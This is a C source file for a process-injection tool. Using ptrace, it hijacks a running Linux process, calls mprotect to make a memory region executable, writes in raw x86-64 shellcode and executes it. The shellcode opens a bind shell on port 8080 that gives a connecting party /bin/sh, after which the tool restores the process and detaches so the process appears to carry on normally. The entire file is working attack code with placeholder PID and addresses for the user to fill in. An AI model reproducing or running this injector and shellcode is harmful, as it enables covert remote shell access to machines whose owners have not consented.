// inject.c
// gcc inject.c -o inject
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>

// --- SHELLCODE CONFIGURATION ---
// Add 0xCC (INT3) at the end
// Structure: [Socket/Bind/Listen/Accept] -> [Fork] -> [Parent Jumps to End] -> [Child Execs] -> [End: INT3]
unsigned char shellcode[] =
    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"  // socket
    "\x52\xc7\x04\x24\x02\x00\x1f\x90\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05" // bind (Port 8080)
    "\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97"  // listen, accept
    // --- FORK Logic ---
    "\x48\x31\xd2\x6a\x39\x58\x0f\x05" // Fork
    "\x48\x85\xc0\x75\x26"             // TEST RAX, RAX; JNZ +38 (Jump to Parent Landing Pad)
    // --- CHILD LOGIC ---
    "\x6a\x02\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6" // Dup2
    "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05" // Execve
    // --- PARENT LANDING PAD ---
    // The JNZ jumps here. Place an INT3 (0xCC) here.
    "\xcc"; 

size_t shellcode_len = sizeof(shellcode) - 1;

// Helper: Write memory
int write_mem(pid_t pid, unsigned long long addr, unsigned char *buf, size_t len) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int fd = open(path, O_RDWR);
    if (fd == -1) { perror("open mem"); return -1; }
    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) { perror("lseek"); close(fd); return -1; }
    if (write(fd, buf, len) != (ssize_t)len) { perror("write"); close(fd); return -1; }
    close(fd);
    return 0;
}

int main(void) {
    // CHANGE THIS
    // setup pid and addresses
    pid_t pid = 7; // pid to inject into
    unsigned long long libc_addr = 0x738efe5d8000; // runtime addr of libc
    unsigned long long rwx_addr = 0x738efe7dd000; // addr of target region to make rwx (start addr)
    unsigned long long rwx_len = 0x738efe7ea000 - rwx_addr; // length of target region to make rwx (end - start)
    unsigned long long int3_addr = libc_addr + 0x283ea; // runtime addr of nop to inject int3
    unsigned long long mprot_addr = libc_addr + 0x125c40; // mprotect runtime addr

    printf("[*] Attaching to pid %d\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace_attach");
        return 1;
    }
    waitpid(pid, NULL, 0);

    // 1. SAVE ORIGINAL REGISTERS
    struct user_regs_struct orig_regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs) == -1) {
        perror("ptrace_getregs original");
        return 1;
    }
    printf("[*] Saved Original RIP: 0x%llx\n", orig_regs.rip);

    // 2. PREPARE INT3 (Write INT3 to nop addr)
    long original_word = ptrace(PTRACE_PEEKDATA, pid, int3_addr, NULL);
    long modified_word = (original_word & 0xFFFFFFFFFFFFFF00) | 0xCC;
    ptrace(PTRACE_POKEDATA, pid, int3_addr, modified_word);

    // 3. SETUP MPROTECT CALL (Make rwx_addr executable)
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    // Write return address (int3_addr) to stack
    unsigned long long stack_return_addr = regs.rsp - 8;
    ptrace(PTRACE_POKEDATA, pid, stack_return_addr, int3_addr);

    // setup mprotect arg registers, rsp, and rip
    regs.rdi = rwx_addr;          // Address
    regs.rsi = rwx_len;           // Length of target rwx region (end addr - start addr)
    regs.rdx = 7;                // PROT_READ|PROT_WRITE|PROT_EXEC (7 is rwx, 5 is r-x)
    regs.rip = mprot_addr + 2;   // add 2 if needed
    regs.rsp = stack_return_addr; // return to int3

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    // 4. RUN MPROTECT
    printf("[*] Running mprotect...\n");
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, NULL, 0); // Wait for INT3 at int3_addr

    // Restore the int3 instruction to original nop
    ptrace(PTRACE_POKEDATA, pid, int3_addr, original_word);

    // 5. INJECT SHELLCODE
    printf("[*] Writing shellcode to 0x%llx...\n", rwx_addr);
    if (write_mem(pid, rwx_addr, shellcode, shellcode_len) != 0) {
        fprintf(stderr, "Failed to write shellcode\n");
        return 1;
    }

    // 6. EXECUTE SHELLCODE
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    regs.rip = rwx_addr; // Point RIP to start of shellcode
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    printf("[*] Executing Shellcode (Parent will TRAP when done)\n");
    ptrace(PTRACE_CONT, pid, NULL, NULL);

    // 7. CATCH THE TRAP IN PARENT
    printf("[*] Connect to bind port now\n");
    int status;
    waitpid(pid, &status, 0); // now we need to connect to the shell to continue the process

    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
        printf("[+] Parent finished shellcode loop and hit INT3\n"); 

        // 8. RESTORE ORIGINAL STATE
        // We simply overwrite the current registers with the backup we took at the start.
        // This includes RIP, RSP, RBP, etc.
        printf("[*] Restoring original registers (RIP: 0x%llx)...\n", orig_regs.rip);
        if (ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs) == -1) {
            perror("ptrace_setregs restore");
            return 1;
        }

        // 9. DETACH
        printf("[+] Detaching. Process should resume normal operation.\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
    } else {
        printf("[-] Something went wrong, process didn't trap as expected. Status: %d\n", status);
        // Try to detach anyway to avoid killing it
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
    }

    return 0;
}
